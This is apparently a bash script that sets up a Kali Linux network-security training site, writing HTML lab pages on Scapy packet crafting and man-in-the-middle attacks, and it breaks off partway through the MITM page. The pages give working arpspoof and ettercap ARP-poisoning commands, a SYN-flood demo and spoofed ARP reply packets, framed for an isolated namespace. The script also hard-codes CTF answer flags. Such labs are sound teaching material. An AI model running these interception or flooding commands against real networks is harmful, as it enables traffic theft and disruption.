#!/bin/bash
#===============================================================================
# Network Analysis & Traffic Interception Labs - Kali Linux Setup
#===============================================================================
# Educational cybersecurity labs for learning network analysis techniques
# All labs use isolated environments - NO attacks on external networks
#===============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
WEB_ROOT="/var/www/html/network-labs"
SCRIPTS_DIR="/opt/network-labs"
PCAP_DIR="${WEB_ROOT}/forensics-lab/pcaps"
WIRELESS_DIR="${WEB_ROOT}/wireless-lab/captures"
LOG_FILE="/var/log/network-labs-setup.log"

# CTF Flags for PCAP challenges
FLAG1="FLAG{p4ssw0rd_3xf1ltr4t10n_d3t3ct3d}"
FLAG2="FLAG{c2_b34c0n_1d3nt1f13d_443}"
FLAG3="FLAG{ftp_f1l3_r3c0v3r3d_s3cr3t}"
FLAG4="FLAG{dns_tunn3l_d4t4_3xtr4ct3d}"
FLAG5="FLAG{http_s3ss10n_r3c0nstruct3d}"

#===============================================================================
# Helper Functions
#===============================================================================

log() {
    echo -e "${GREEN}[+]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1" >> "$LOG_FILE"
}

error() {
    echo -e "${RED}[-]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" >> "$LOG_FILE"
}

header() {
    echo ""
    echo -e "${PURPLE}========================================${NC}"
    echo -e "${PURPLE} $1${NC}"
    echo -e "${PURPLE}========================================${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root"
        exit 1
    fi
}

#===============================================================================
# Package Installation
#===============================================================================

install_packages() {
    header "Installing Required Packages"

    log "Updating package lists..."
    apt-get update -qq

    log "Installing network analysis tools..."
    apt-get install -y -qq \
        python3-scapy \
        scapy \
        ettercap-text-only \
        ettercap-graphical \
        mitmproxy \
        dnsmasq \
        snort \
        suricata \
        wireshark \
        tshark \
        tcpdump \
        nmap \
        netcat-openbsd \
        hping3 \
        arping \
        arpwatch \
        dsniff \
        macchanger \
        aircrack-ng \
        zeek \
        python3-pip \
        python3-dpkt \
        vsftpd \
        snmpd \
        snmp \
        apache2 \
        php \
        libapache2-mod-php \
        net-tools \
        iproute2 \
        bridge-utils \
        traceroute \
        whois \
        bind9-dnsutils \
        curl \
        wget \
        jq \
        2>/dev/null || true

    log "Installing Python packages..."
    pip3 install --quiet \
        scapy \
        dpkt \
        pyshark \
        netifaces \
        requests \
        flask \
        2>/dev/null || true

    log "Package installation complete"
}

#===============================================================================
# Directory Structure Setup
#===============================================================================

setup_directories() {
    header "Setting Up Directory Structure"

    log "Creating web root directories..."
    mkdir -p "${WEB_ROOT}"/{scapy-lab,mitm-lab,forensics-lab/pcaps,protocol-lab,recon-lab,traffic-lab,ids-lab,wireless-lab/captures,defense-lab}

    log "Creating scripts directory..."
    mkdir -p "${SCRIPTS_DIR}"/{scapy,mitm,forensics,traffic,ids}

    log "Setting permissions..."
    chown -R www-data:www-data "${WEB_ROOT}"
    chmod -R 755 "${WEB_ROOT}"
    chmod -R 755 "${SCRIPTS_DIR}"

    log "Directory structure created"
}

#===============================================================================
# Web Dashboard - Main Index
#===============================================================================

create_main_dashboard() {
    header "Creating Main Web Dashboard"

    cat > "${WEB_ROOT}/index.html" << 'DASHBOARD_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Analysis Labs</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #e4e4e4;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 10px;
            color: #00d9ff;
            text-shadow: 0 0 20px rgba(0, 217, 255, 0.5);
        }
        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 1.1em;
        }
        .warning-banner {
            background: linear-gradient(90deg, #ff6b35, #f7931e);
            color: #000;
            padding: 15px 25px;
            border-radius: 10px;
            margin-bottom: 30px;
            text-align: center;
            font-weight: bold;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--card-color), transparent);
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            border-color: var(--card-color);
        }
        .card h3 {
            color: var(--card-color);
            margin-bottom: 10px;
            font-size: 1.4em;
        }
        .card p { color: #aaa; line-height: 1.6; margin-bottom: 15px; }
        .card-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 15px;
        }
        .difficulty {
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
        }
        .beginner { background: #27ae60; color: #fff; }
        .intermediate { background: #f39c12; color: #000; }
        .advanced { background: #e74c3c; color: #fff; }
        .btn {
            background: var(--card-color);
            color: #000;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .btn:hover { transform: scale(1.05); box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3); }
        .tools-list {
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 0.9em;
            color: #00d9ff;
        }
        .stats {
            display: flex;
            justify-content: center;
            gap: 50px;
            margin: 30px 0;
            flex-wrap: wrap;
        }
        .stat {
            text-align: center;
        }
        .stat-number {
            font-size: 2.5em;
            font-weight: bold;
            color: #00d9ff;
        }
        .stat-label { color: #888; }

        /* Card colors */
        .card-scapy { --card-color: #e74c3c; }
        .card-mitm { --card-color: #9b59b6; }
        .card-forensics { --card-color: #3498db; }
        .card-protocol { --card-color: #1abc9c; }
        .card-recon { --card-color: #f39c12; }
        .card-traffic { --card-color: #e91e63; }
        .card-ids { --card-color: #00bcd4; }
        .card-wireless { --card-color: #8bc34a; }
        .card-defense { --card-color: #ff5722; }
    </style>
</head>
<body>
    <div class="container">
        <h1>&#128373; Network Analysis Labs</h1>
        <p class="subtitle">Hands-on cybersecurity training for network analysis and traffic interception</p>

        <div class="warning-banner">
            &#9888; EDUCATIONAL USE ONLY - All labs use isolated network namespaces - Never attack external networks
        </div>

        <div class="stats">
            <div class="stat">
                <div class="stat-number">9</div>
                <div class="stat-label">Lab Modules</div>
            </div>
            <div class="stat">
                <div class="stat-number">8</div>
                <div class="stat-label">PCAP Challenges</div>
            </div>
            <div class="stat">
                <div class="stat-number">50+</div>
                <div class="stat-label">Exercises</div>
            </div>
        </div>

        <div class="grid">
            <div class="card card-scapy">
                <h3>&#128228; Packet Crafting Lab</h3>
                <p>Learn to craft custom network packets using Scapy. Create SYN floods, ICMP redirects, ARP packets, and understand TCP session concepts.</p>
                <div class="tools-list">scapy, python3, hping3</div>
                <div class="card-footer">
                    <span class="difficulty intermediate">Intermediate</span>
                    <a href="scapy-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-mitm">
                <h3>&#128375; Man-in-the-Middle Lab</h3>
                <p>Practice ARP spoofing, DNS spoofing, SSL stripping, and traffic interception in an isolated network namespace.</p>
                <div class="tools-list">ettercap, arpspoof, mitmproxy, dnsmasq</div>
                <div class="card-footer">
                    <span class="difficulty advanced">Advanced</span>
                    <a href="mitm-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-forensics">
                <h3>&#128269; Network Forensics Lab</h3>
                <p>CTF-style challenges! Analyze pcap files to find exfiltrated data, identify C2 beacons, extract files, and decode DNS tunneling.</p>
                <div class="tools-list">wireshark, tshark, zeek, tcpdump</div>
                <div class="card-footer">
                    <span class="difficulty intermediate">Intermediate</span>
                    <a href="forensics-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-protocol">
                <h3>&#128202; Protocol Deep-Dive</h3>
                <p>Understand TCP handshakes, HTTP vs HTTPS, DNS queries, ICMP types, and ARP flows with Wireshark filter exercises.</p>
                <div class="tools-list">wireshark, tshark, tcpdump</div>
                <div class="card-footer">
                    <span class="difficulty beginner">Beginner</span>
                    <a href="protocol-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-recon">
                <h3>&#127919; Active Reconnaissance</h3>
                <p>Master banner grabbing, service enumeration, OS fingerprinting, network mapping, and SNMP enumeration techniques.</p>
                <div class="tools-list">nmap, netcat, snmpwalk, traceroute</div>
                <div class="card-footer">
                    <span class="difficulty beginner">Beginner</span>
                    <a href="recon-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-traffic">
                <h3>&#128640; Traffic Generation</h3>
                <p>Generate specific traffic patterns for analysis. Create HTTP logins, DNS queries, FTP sessions, and capture them for analysis.</p>
                <div class="tools-list">python3, curl, ftp, netcat</div>
                <div class="card-footer">
                    <span class="difficulty intermediate">Intermediate</span>
                    <a href="traffic-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-ids">
                <h3>&#128737; Intrusion Detection Lab</h3>
                <p>Write and test Snort/Suricata rules to detect port scans, SQL injection, brute force attacks, and data exfiltration.</p>
                <div class="tools-list">snort, suricata, tcpreplay</div>
                <div class="card-footer">
                    <span class="difficulty advanced">Advanced</span>
                    <a href="ids-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-wireless">
                <h3>&#128225; Wireless Concepts</h3>
                <p>Analyze WPA handshakes, understand deauth packets, and practice with provided capture files. No actual WiFi hacking!</p>
                <div class="tools-list">aircrack-ng, wireshark</div>
                <div class="card-footer">
                    <span class="difficulty intermediate">Intermediate</span>
                    <a href="wireless-lab/" class="btn">Start Lab</a>
                </div>
            </div>

            <div class="card card-defense">
                <h3>&#128737; Firewall &amp; Defense Lab</h3>
                <p>Master iptables firewall rules, log analysis, intrusion prevention, and network monitoring for defensive security.</p>
                <div class="tools-list">iptables, fail2ban, arpwatch, tcpdump</div>
                <div class="card-footer">
                    <span class="difficulty intermediate">Intermediate</span>
                    <a href="defense-lab/" class="btn">Start Lab</a>
                </div>
            </div>
        </div>

        <div style="text-align: center; margin-top: 40px; color: #666;">
            <p>Helper scripts location: <code>/opt/network-labs/</code></p>
            <p>PCAP challenges: <code>/var/www/html/network-labs/forensics-lab/pcaps/</code></p>
        </div>
    </div>
</body>
</html>
DASHBOARD_EOF

    log "Main dashboard created"
}

#===============================================================================
# Lab 1: Packet Crafting with Scapy
#===============================================================================

create_scapy_lab() {
    header "Creating Scapy Packet Crafting Lab"

    cat > "${WEB_ROOT}/scapy-lab/index.html" << 'SCAPY_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Packet Crafting Lab - Scapy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #e4e4e4;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #e74c3c; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .back-link:hover { text-decoration: underline; }
        .section {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
        }
        h2 { color: #e74c3c; margin-bottom: 15px; border-bottom: 2px solid #e74c3c; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 15px;
            overflow-x: auto;
            font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 0.9em;
            position: relative;
        }
        code { color: #58a6ff; }
        .command { color: #7ee787; }
        .comment { color: #8b949e; }
        .warning {
            background: rgba(231, 76, 60, 0.2);
            border-left: 4px solid #e74c3c;
            padding: 15px;
            margin: 15px 0;
            border-radius: 0 8px 8px 0;
        }
        .tip {
            background: rgba(46, 204, 113, 0.2);
            border-left: 4px solid #2ecc71;
            padding: 15px;
            margin: 15px 0;
            border-radius: 0 8px 8px 0;
        }
        .exercise {
            background: rgba(52, 152, 219, 0.2);
            border-left: 4px solid #3498db;
            padding: 15px;
            margin: 15px 0;
            border-radius: 0 8px 8px 0;
        }
        .exercise h4 { color: #3498db; margin-bottom: 10px; }
        .copy-btn {
            position: absolute;
            top: 5px;
            right: 5px;
            background: #30363d;
            border: none;
            color: #fff;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .copy-btn:hover { background: #484f58; }
        ul { margin-left: 20px; line-height: 1.8; }
        .output { background: #1a1a1a; color: #0f0; padding: 10px; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128228; Packet Crafting Lab with Scapy</h1>
        <p style="color: #888; margin-bottom: 20px;">Learn to craft custom network packets for security testing and analysis</p>

        <div class="warning">
            <strong>&#9888; Safety Notice:</strong> All exercises use localhost (127.0.0.1) or isolated network namespaces.
            Never use these techniques on networks you don't own or have explicit permission to test.
        </div>

        <div class="section">
            <h2>Getting Started with Scapy</h2>
            <p>Scapy is a powerful Python library for packet manipulation. Start the interactive shell:</p>
            <pre><code class="command">sudo scapy</code></pre>

            <h3>Basic Packet Structure</h3>
            <pre><code><span class="comment"># View available layers</span>
ls()

<span class="comment"># Examine a specific layer</span>
ls(IP)
ls(TCP)
ls(ICMP)

<span class="comment"># Create a simple IP packet</span>
pkt = IP(dst="127.0.0.1")
pkt.show()

<span class="comment"># Stack layers with /</span>
pkt = IP(dst="127.0.0.1")/TCP(dport=80)
pkt.show2()  <span class="comment"># show2() calculates checksums</span></code></pre>
        </div>

        <div class="section">
            <h2>Exercise 1: ICMP Packet Crafting</h2>

            <h3>Basic ICMP Echo (Ping)</h3>
            <pre><code><span class="comment"># Create and send a ping to localhost</span>
pkt = IP(dst="127.0.0.1")/ICMP()
response = sr1(pkt, timeout=2)
response.show()

<span class="comment"># Custom ICMP with data payload</span>
pkt = IP(dst="127.0.0.1")/ICMP()/Raw(load="Hello from Scapy!")
sr1(pkt, timeout=2)</code></pre>

            <h3>ICMP Redirect Packet (Educational)</h3>
            <pre><code><span class="comment"># ICMP Redirect structure - for understanding only</span>
<span class="comment"># Type 5, Code 1 = Redirect for host</span>
redirect = IP(dst="127.0.0.1")/ICMP(type=5, code=1, gw="10.0.0.1")
redirect.show2()

<span class="comment"># Examine the packet layers</span>
hexdump(redirect)</code></pre>

            <div class="exercise">
                <h4>&#127919; Exercise: Craft an ICMP Packet</h4>
                <p><strong>Task:</strong> Create an ICMP timestamp request (type=13) to localhost and capture the response.</p>
                <p><strong>Hint:</strong> Use <code>ICMP(type=13)</code> and check the response type.</p>
            </div>
        </div>

        <div class="section">
            <h2>Exercise 2: TCP Packet Crafting</h2>

            <h3>TCP SYN Packet</h3>
            <pre><code><span class="comment"># Create a SYN packet</span>
syn = IP(dst="127.0.0.1")/TCP(dport=80, flags="S", seq=1000)
syn.show2()

<span class="comment"># Send and receive response</span>
response = sr1(syn, timeout=2)
if response:
    response.show()
    print(f"Response flags: {response[TCP].flags}")</code></pre>

            <h3>TCP Three-Way Handshake Simulation</h3>
            <pre><code><span class="comment"># Step 1: SYN</span>
ip = IP(dst="127.0.0.1")
syn = TCP(sport=RandShort(), dport=22, flags="S", seq=100)
syn_ack = sr1(ip/syn, timeout=2)

if syn_ack and syn_ack[TCP].flags == "SA":
    print("Received SYN-ACK!")

    <span class="comment"># Step 2: ACK</span>
    ack = TCP(sport=syn.sport, dport=22, flags="A",
              seq=syn_ack.ack, ack=syn_ack.seq + 1)
    send(ip/ack)
    print("Handshake complete!")
else:
    print("Port may be closed or filtered")</code></pre>

            <h3>SYN Flood Demo (Rate-Limited, Localhost Only)</h3>
            <pre><code><span class="comment"># WARNING: Educational demonstration only!</span>
<span class="comment"># This sends 10 SYN packets to localhost with 0.5s delay</span>

from time import sleep

target = "127.0.0.1"
port = 80

for i in range(10):
    pkt = IP(dst=target)/TCP(sport=RandShort(), dport=port, flags="S")
    send(pkt, verbose=0)
    print(f"Sent SYN packet {i+1}/10")
    sleep(0.5)  <span class="comment"># Rate limiting</span>

print("Demo complete - check with: ss -tan | grep SYN")</code></pre>

            <div class="exercise">
                <h4>&#127919; Exercise: TCP Flag Analysis</h4>
                <p><strong>Task:</strong> Create packets with different TCP flags and observe responses:</p>
                <ul>
                    <li>Send a FIN packet to an open port - what happens?</li>
                    <li>Send a RST packet - what's the response?</li>
                    <li>Send a NULL packet (no flags) - what do you observe?</li>
                </ul>
                <p><strong>Hint:</strong> Use <code>flags="F"</code>, <code>flags="R"</code>, <code>flags=""</code></p>
            </div>
        </div>

        <div class="section">
            <h2>Exercise 3: ARP Packet Crafting</h2>

            <h3>ARP Request</h3>
            <pre><code><span class="comment"># Create an ARP "who-has" request</span>
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1")
arp_request.show2()

<span class="comment"># View ARP packet fields</span>
ls(ARP)
<span class="comment"># op=1 is request, op=2 is reply</span>
<span class="comment"># hwsrc/hwdst = hardware (MAC) addresses</span>
<span class="comment"># psrc/pdst = protocol (IP) addresses</span></code></pre>

            <h3>Understanding ARP Spoofing Structure</h3>
            <pre><code><span class="comment"># ARP Reply structure (educational - understanding the attack)</span>
<span class="comment"># In a real attack, this would associate attacker's MAC with gateway IP</span>

<span class="comment"># Normal ARP reply structure:</span>
arp_reply = ARP(
    op=2,           <span class="comment"># ARP Reply</span>
    hwsrc="aa:bb:cc:dd:ee:ff",  <span class="comment"># Sender MAC (attacker would use their MAC)</span>
    psrc="192.168.1.1",         <span class="comment"># Sender IP (gateway IP being spoofed)</span>
    hwdst="11:22:33:44:55:66",  <span class="comment"># Target MAC</span>
    pdst="192.168.1.100"        <span class="comment"># Target IP</span>
)
arp_reply.show()

<span class="comment"># Examine the structure</span>
print(f"Operation: {'Request' if arp_reply.op == 1 else 'Reply'}")
print(f"Claiming {arp_reply.psrc} is at {arp_reply.hwsrc}")</code></pre>

            <div class="tip">
                <strong>&#128161; What to Look For in Wireshark:</strong>
                <ul>
                    <li>Filter: <code>arp</code></li>
                    <li>ARP requests show "Who has X? Tell Y"</li>
                    <li>ARP replies show "X is at [MAC]"</li>
                    <li>Gratuitous ARP: request where sender = target</li>
                </ul>
            </div>
        </div>

        <div class="section">
            <h2>Exercise 4: DNS Packet Crafting</h2>
            <pre><code><span class="comment"># Create a DNS query</span>
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, timeout=2)

if response and response.haslayer(DNS):
    print(f"Query: {response[DNS].qd.qname}")
    print(f"Answer: {response[DNS].an.rdata if response[DNS].an else 'No answer'}")

<span class="comment"># Examine DNS structure</span>
ls(DNS)
ls(DNSQR)  <span class="comment"># Query Record</span>
ls(DNSRR)  <span class="comment"># Resource Record</span></code></pre>

            <div class="exercise">
                <h4>&#127919; Exercise: DNS Query Types</h4>
                <p><strong>Task:</strong> Send DNS queries for different record types:</p>
                <ul>
                    <li>A record (qtype=1) - IPv4 address</li>
                    <li>AAAA record (qtype=28) - IPv6 address</li>
                    <li>MX record (qtype=15) - Mail server</li>
                    <li>TXT record (qtype=16) - Text records</li>
                </ul>
                <p><strong>Hint:</strong> Use <code>DNSQR(qname="example.com", qtype=15)</code></p>
            </div>
        </div>

        <div class="section">
            <h2>Exercise 5: Packet Capture and Analysis</h2>
            <pre><code><span class="comment"># Sniff packets on loopback</span>
packets = sniff(iface="lo", count=10, timeout=30)
packets.summary()

<span class="comment"># Sniff with filter</span>
tcp_packets = sniff(filter="tcp", count=5, timeout=30)

<span class="comment"># Save to pcap file</span>
wrpcap("/tmp/captured.pcap", packets)

<span class="comment"># Read pcap file</span>
packets = rdpcap("/tmp/captured.pcap")
for pkt in packets:
    pkt.summary()</code></pre>

            <h3>Custom Packet Analysis</h3>
            <pre><code><span class="comment"># Analyze packet contents</span>
pkt = IP(dst="127.0.0.1")/TCP(dport=80, flags="S")

print(f"IP Layer:")
print(f"  Version: {pkt[IP].version}")
print(f"  TTL: {pkt[IP].ttl}")
print(f"  Protocol: {pkt[IP].proto}")

print(f"\nTCP Layer:")
print(f"  Source Port: {pkt[TCP].sport}")
print(f"  Dest Port: {pkt[TCP].dport}")
print(f"  Flags: {pkt[TCP].flags}")
print(f"  Seq: {pkt[TCP].seq}")

<span class="comment"># Raw bytes</span>
print(f"\nRaw packet ({len(raw(pkt))} bytes):")
hexdump(pkt)</code></pre>
        </div>

        <div class="section">
            <h2>Quick Reference: Scapy Commands</h2>
            <table style="width: 100%; border-collapse: collapse;">
                <tr style="background: rgba(0,0,0,0.3);">
                    <th style="padding: 10px; text-align: left; border-bottom: 1px solid #333;">Command</th>
                    <th style="padding: 10px; text-align: left; border-bottom: 1px solid #333;">Description</th>
                </tr>
                <tr><td style="padding: 8px;"><code>ls()</code></td><td style="padding: 8px;">List available layers</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;"><code>ls(layer)</code></td><td style="padding: 8px;">Show layer fields</td></tr>
                <tr><td style="padding: 8px;"><code>pkt.show()</code></td><td style="padding: 8px;">Display packet details</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;"><code>pkt.show2()</code></td><td style="padding: 8px;">Display with calculated values</td></tr>
                <tr><td style="padding: 8px;"><code>send(pkt)</code></td><td style="padding: 8px;">Send at layer 3 (IP)</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;"><code>sendp(pkt)</code></td><td style="padding: 8px;">Send at layer 2 (Ethernet)</td></tr>
                <tr><td style="padding: 8px;"><code>sr1(pkt)</code></td><td style="padding: 8px;">Send and receive one response</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;"><code>sr(pkt)</code></td><td style="padding: 8px;">Send and receive all responses</td></tr>
                <tr><td style="padding: 8px;"><code>sniff(count=N)</code></td><td style="padding: 8px;">Capture N packets</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;"><code>wrpcap(file, pkts)</code></td><td style="padding: 8px;">Save packets to file</td></tr>
                <tr><td style="padding: 8px;"><code>rdpcap(file)</code></td><td style="padding: 8px;">Read packets from file</td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;"><code>hexdump(pkt)</code></td><td style="padding: 8px;">Show raw hex bytes</td></tr>
            </table>
        </div>

        <div class="section">
            <h2>Script: Save and Run</h2>
            <p>Save this as a Python script at <code>/opt/network-labs/scapy/packet_crafter.py</code>:</p>
            <pre><code>#!/usr/bin/env python3
"""Packet Crafting Examples - Run with sudo"""
from scapy.all import *
import sys

def craft_syn(target, port):
    """Craft a SYN packet"""
    pkt = IP(dst=target)/TCP(dport=port, flags="S", seq=1000)
    print(f"[*] Crafted SYN packet to {target}:{port}")
    pkt.show2()
    return pkt

def craft_icmp_ping(target):
    """Craft an ICMP echo request"""
    pkt = IP(dst=target)/ICMP()/Raw(load="Ping from Scapy!")
    print(f"[*] Crafted ICMP Echo to {target}")
    return pkt

def craft_dns_query(domain, dns_server="8.8.8.8"):
    """Craft a DNS query"""
    pkt = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    print(f"[*] Crafted DNS query for {domain}")
    return pkt

if __name__ == "__main__":
    print("=== Packet Crafting Demo ===\n")

    # Demo SYN packet
    syn = craft_syn("127.0.0.1", 80)

    # Demo ICMP
    icmp = craft_icmp_ping("127.0.0.1")

    # Demo DNS
    dns = craft_dns_query("example.com")

    print("\n[*] Packets crafted. Use sr1(pkt) to send and receive.")
</code></pre>
        </div>
    </div>
</body>
</html>
SCAPY_EOF

    log "Scapy lab created"
}

#===============================================================================
# Lab 2: Man-in-the-Middle Lab
#===============================================================================

create_mitm_lab() {
    header "Creating MITM Lab"

    cat > "${WEB_ROOT}/mitm-lab/index.html" << 'MITM_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Man-in-the-Middle Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh; color: #e4e4e4; padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #9b59b6; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #9b59b6; margin-bottom: 15px; border-bottom: 2px solid #9b59b6; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .comment { color: #8b949e; }
        .warning { background: rgba(231,76,60,0.2); border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise h4 { color: #3498db; margin-bottom: 10px; }
        ul, ol { margin-left: 20px; line-height: 1.8; }
        .architecture { background: #0d1117; padding: 20px; border-radius: 10px; font-family: monospace; text-align: center; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128375; Man-in-the-Middle Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Learn MITM techniques in an isolated network namespace</p>

        <div class="warning">
            <strong>&#9888; CRITICAL SAFETY NOTICE:</strong><br>
            All MITM exercises use <strong>isolated network namespaces</strong>. This completely separates lab traffic from your real network.
            <strong>NEVER</strong> perform these attacks on networks you don't own. This is illegal and unethical.
        </div>

        <div class="section">
            <h2>Lab Environment Setup</h2>
            <p>Our isolated environment creates virtual hosts that can only communicate with each other:</p>

            <div class="architecture">
                <pre style="background: none; border: none; color: #00d9ff;">
┌─────────────────────────────────────────────────────────────┐
│                    ISOLATED NAMESPACE                        │
│                                                              │
│   ┌─────────┐      ┌──────────┐      ┌─────────┐           │
│   │ Victim  │ ←──→ │ Attacker │ ←──→ │ Gateway │           │
│   │10.0.0.2 │      │ 10.0.0.3 │      │10.0.0.1 │           │
│   └─────────┘      └──────────┘      └─────────┘           │
│                         ↑                                    │
│                    You are here                              │
└─────────────────────────────────────────────────────────────┘
                    (No external access)
                </pre>
            </div>

            <h3>Start the Isolated Environment</h3>
            <pre><code><span class="comment"># Initialize the MITM lab environment</span>
sudo /opt/network-labs/mitm/setup-mitm-env.sh start

<span class="comment"># Check the environment status</span>
sudo /opt/network-labs/mitm/setup-mitm-env.sh status

<span class="comment"># Stop and cleanup when done</span>
sudo /opt/network-labs/mitm/setup-mitm-env.sh stop</code></pre>
        </div>

        <div class="section">
            <h2>Exercise 1: ARP Spoofing</h2>
            <p>ARP spoofing tricks a victim into sending traffic through your machine by poisoning their ARP cache.</p>

            <h3>How ARP Spoofing Works</h3>
            <div class="architecture">
                <pre style="background: none; border: none; color: #7ee787;">
Normal Flow:
  Victim → Gateway → Internet

After ARP Spoofing:
  Victim → Attacker → Gateway → Internet
           (captures traffic)
                </pre>
            </div>

            <h3>Using arpspoof (Inside Namespace)</h3>
            <pre><code><span class="comment"># Enter the attacker namespace</span>
sudo ip netns exec attacker_ns bash

<span class="comment"># Enable IP forwarding (required for forwarding victim's traffic)</span>
echo 1 > /proc/sys/net/ipv4/ip_forward

<span class="comment"># Tell victim (10.0.0.2) that we are the gateway (10.0.0.1)</span>
arpspoof -i veth-atk -t 10.0.0.2 10.0.0.1

<span class="comment"># In another terminal, tell gateway we are the victim</span>
arpspoof -i veth-atk -t 10.0.0.1 10.0.0.2</code></pre>

            <h3>Using Ettercap (Inside Namespace)</h3>
            <pre><code><span class="comment"># Text mode ARP poisoning</span>
sudo ip netns exec attacker_ns ettercap -T -q -i veth-atk -M arp:remote /10.0.0.2// /10.0.0.1//

<span class="comment"># With traffic capture</span>
sudo ip netns exec attacker_ns ettercap -T -q -i veth-atk -M arp:remote -w /tmp/captured.pcap /10.0.0.2// /10.0.0.1//</code></pre>

            <h3>Detecting ARP Spoofing</h3>
